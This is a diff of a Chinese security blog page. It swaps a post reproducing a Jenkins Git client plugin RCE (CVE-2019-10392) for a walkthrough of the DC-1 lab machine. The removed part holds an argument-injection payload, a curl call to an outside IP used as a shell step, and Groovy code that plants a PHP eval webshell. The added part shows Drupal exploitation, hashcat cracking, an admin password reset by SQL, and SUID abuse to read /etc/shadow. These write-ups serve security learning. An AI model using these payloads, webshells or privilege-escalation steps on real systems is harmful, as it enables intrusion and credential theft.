@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>CVE-2019-10392：Jenkins Git client插件RCE复现 · Twosmi1e&#39;s Blog</title>
+    <title>DC-1渗透报告 · Twosmi1e&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Twosmi1e&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">CVE-2019-10392：Jenkins Git client插件RCE复现</a>
+                <a href="#" class="post-name">DC-1渗透报告</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            CVE-2019-10392：Jenkins Git client插件RCE复现
+            DC-1渗透报告
             <!-- 404 -->
             
         </h1>
@@ -261,13 +261,15 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "靶机渗透">靶机渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "wp">wp</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">574</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">632</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -396,27 +398,28 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://jenkins.io/security/advisory/2019-09-12/" target="_blank" rel="external">https://jenkins.io/security/advisory/2019-09-12/</a><br>Git客户端插件接受用户指定的值作为git ls-remote调用的参数，以验证指定URL处是否存在Git存储库。 这种方式允许具有Job / Configure权限的攻击者，以运行Jenkins进程的OS用户的权限在Jenkins主服务器上执行任意系统命令。当以root权限运行Jenkins时，攻击者将会通过攻击得到root权限。</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Git client Plugin &lt;= 2.8.4</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用docker搭建<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker search jenkins</span><br><span class="line">docker pull jenkins/jenkins</span><br><span class="line">映射8080端口</span><br><span class="line">docker run -d -p 8080:8080 -p 50000:50000 jenkins/jenkins</span><br></pre></td></tr></table></figure></p>
-<p>访问IP:8080后需要输入密码<br>进入容器获取密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 79931fdd69d5 /bin/bash</span><br><span class="line">jenkins@79931fdd69d5:/$ cat /var/jenkins_home/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure></p>
-<p>开始安装<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701368800.png" alt="Alt text"><br>安装完成后会让你创建用户，随便创建一个后进入界面。<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570701989181.png" alt="Alt text"><br>选择Manage来新建用户<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702166984.png" alt="Alt text"><br>创建一个非管理员用户并在Configure Global Security里给予如图权限<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570702599654.png" alt="Alt text"><br>下载漏洞版本插件<br><a href="http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git-client/2.8.2/git-client.hpi</a><br><a href="http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi" target="_blank" rel="external">http://updates.jenkins-ci.org/download/plugins/git/3.12.0/git.hpi</a><br>将两个插件上传<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570761278914.png" alt="Alt text"><br>安装完成后重启<img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570762944751.png" alt="Alt text"><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570763755386.png" alt="Alt text"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录创建的非管理用户<br>创建一个流水线任务</p>
-<p>在连接git仓库处输入payload<br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764278108.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`ls`&quot;</span><br></pre></td></tr></table></figure></p>
-<p>反弹一个shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--upload-pack=&quot;`curl http://106.54.229.29:9999`&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570764547092.png" alt="Alt text"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>查看文档<a href="https://git-scm.com/docs/git-ls-remote.html" target="_blank" rel="external">https://git-scm.com/docs/git-ls-remote.html</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570772486756.png" alt="Alt text"><br>在远程主机上指定git-upload-pack的完整路径。 这允许列出通过SSH访问的存储库中的引用，并且SSH守护程序不使用用户配置的PATH。由此可以在服务器上执行任意命令。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>实际上是一个比较鸡肋的洞，服务器上必须要低版本插件，并且配合弱口令或者未授权才能进入后台利用。</p>
-<p>其实在后台有个地方能直接执行命令<br>在<a href="http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。" target="_blank" rel="external">http://ip:port/script下面有脚本命令行，属于Jenkins正常功能，利用这个功能可以执行系统命令，配合未授权更方便。</a><br><img src="/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/1570773935872.png" alt="Alt text"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">println(&quot;id&quot;.execute().getText())</span><br><span class="line"></span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[test]);?&gt;&apos;);</span><br><span class="line"></span><br><span class="line">def webshell = &apos;&lt;?php @eval($_POST[test]);?&gt;&apos;</span><br><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&quot;$webshell&quot;);</span><br></pre></td></tr></table></figure></p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做了一下DC1到DC6的靶机渗透，简单记录一下过程</p>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>CVE-2018-7600 Drupal核心远程代码执行漏洞<br>drupal配置文件和重置管理员密码<br>suid提权</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Nmap扫一下端口发现<br>80端口是drupal 7 服务<br>111 端口是 rpcbind服务</p>
+<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>用msf开始搜一下drupal漏洞<br><img src="/2019/10/16/DC-1渗透报告/1562240397838.png" alt="Alt text"><br>选一个漏洞设置远程IP地址开始攻击<br><img src="/2019/10/16/DC-1渗透报告/1562240478760.png" alt="Alt text"><br>反弹回一个msf的shell  目录下有flag1<br><img src="/2019/10/16/DC-1渗透报告/1562240673845.png" alt="Alt text"><br>在/sites/default目录下有数据库配置文件 有flag2和数据库用户名密码<br><img src="/2019/10/16/DC-1渗透报告/1562240636851.png" alt="Alt text"><br>登入数据库  有管理员用户名及密码hash<br><img src="/2019/10/16/DC-1渗透报告/1562240709606.png" alt="Alt text"><br>这里有两种方法<br>第一种使用hashcat暴力破解，使用网上的常用密码字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ ./hashcat64.exe -m 7900 hashes.txt rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">OpenCL Platform #1: NVIDIA Corporation</span><br><span class="line">======================================</span><br><span class="line">* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCU</span><br><span class="line"></span><br><span class="line">Hashes: 3 digests; 3 unique digests, 3 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Uses-64-Bit</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: rockyou.txt</span><br><span class="line">* Passwords.: 14344391</span><br><span class="line">* Bytes.....: 139921497</span><br><span class="line">* Keyspace..: 14344384</span><br><span class="line">* Runtime...: 2 secs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR:53cr3t</span><br><span class="line">Approaching final keyspace - workload adjusted.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Type........: Drupal7</span><br><span class="line">Hash.Target......: hashes.txt</span><br><span class="line">Time.Started.....: Fri Mar 08 09:19:57 2019 (7 mins, 52 secs)</span><br><span class="line">Time.Estimated...: Fri Mar 08 09:27:49 2019 (0 secs)</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    36639 H/s (2.15ms) @ Accel:128 Loops:32 Thr:64 Vec:1</span><br><span class="line">Recovered........: 2/3 (66.67%) Digests, 2/3 (66.67%) Salts</span><br><span class="line">Progress.........: 43033152/43033152 (100.00%)</span><br><span class="line">Rejected.........: 0/43033152 (0.00%)</span><br><span class="line">Restore.Point....: 14344384/14344384 (100.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:16352-16384</span><br><span class="line">Candidates.#1....: $HEX[284d6f75746f6e] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br><span class="line">Hardware.Mon.#1..: Temp: 69c Fan: 47% Util: 96% Core:1809MHz Mem:3802MHz Bus:16</span><br></pre></td></tr></table></figure></p>
+<p>密码是53cr3t。</p>
+<p>方法二是通过数据库操作修改密码<br>参考链接：<br><a href="https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima" target="_blank" rel="external">https://www.yuzhi100.com/article/drupal-7-chongzhi-guanliyuan-mima</a></p>
+<p>用drupal自带的 password-hash.sh 加密 drupal<br><img src="/2019/10/16/DC-1渗透报告/1562315416008.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set pass=&apos;$S$DFLfuzfO9WDKAJcUHnNmhS9NwOD6MRj3pk00qEl4O7iNBD2X4n3v&apos; where name=&apos;admin&apos;;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/10/16/DC-1渗透报告/1562315497833.png" alt="Alt text"><br>然后回浏览器登录</p>
+<p>翻一下后台发现flag3<br><img src="/2019/10/16/DC-1渗透报告/1562315539055.png" alt="Alt text"><br><img src="/2019/10/16/DC-1渗透报告/1562315586255.png" alt="Alt text"><br>提示查看shadow文件<br>继续翻目录翻到flag4<br><img src="/2019/10/16/DC-1渗透报告/1562316316583.png" alt="Alt text"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">https://github.com/rebootuser/LinEnum</a><br>wget下载这个脚本跑一下<br><img src="/2019/10/16/DC-1渗透报告/1562316619894.png" alt="Alt text"><br>发现提示可能有SUID提权<br>之前flag也提示了用find命令</p>
+<pre><code>find /etc/shadow -exec cat {} \;&gt; all.txt
+</code></pre><p><img src="/2019/10/16/DC-1渗透报告/1562316739537.png" alt="Alt text"><br>拿到密码hash，然后用john跑一下<br><img src="/2019/10/16/DC-1渗透报告/1562316785690.png" alt="Alt text"></p>
+<p>也可以直接读flag5文件<br><img src="/2019/10/16/DC-1渗透报告/1562316870962.png" alt="Alt text"><br>完成</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://gv7.me/articles/2017/batch-crack-shadows/" target="_blank" rel="external">http://gv7.me/articles/2017/batch-crack-shadows/</a><br><a href="https://www.anquanke.com/post/id/86979" target="_blank" rel="external">https://www.anquanke.com/post/id/86979</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://www.twosmi1e.com">two_smi1e</a>
-            <p>原文链接: <a href="https://www.twosmi1e.com/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/">https://www.twosmi1e.com/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/</a>
-            <p>发表日期: <a href="https://www.twosmi1e.com/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/">October 16th 2019, 2:03:38 pm</a>
+            <p>原文链接: <a href="https://www.twosmi1e.com/2019/10/16/DC-1渗透报告/">https://www.twosmi1e.com/2019/10/16/DC-1渗透报告/</a>
+            <p>发表日期: <a href="https://www.twosmi1e.com/2019/10/16/DC-1渗透报告/">October 16th 2019, 2:18:12 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -424,17 +427,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/10/16/DC-1渗透报告/" title= DC-1渗透报告 >
-                    <div class="nextTitle">DC-1渗透报告</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/12/20/PHP反序列化/" title= PHP反序列化 >
-                    <div class="prevTitle">PHP反序列化</div>
+                <a href= "/2019/10/16/CVE-2019-10392：Jenkins-Git-client插件RCE复现/" title= CVE-2019-10392：Jenkins Git client插件RCE复现 >
+                    <div class="prevTitle">CVE-2019-10392：Jenkins Git client插件RCE复现</div>
                 </a>
             
         </li>
@@ -543,7 +541,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响范围"><span class="toc-number">2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">6.</span> <span class="toc-text">小结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#知识点"><span class="toc-number">2.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web渗透"><span class="toc-number">4.</span> <span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
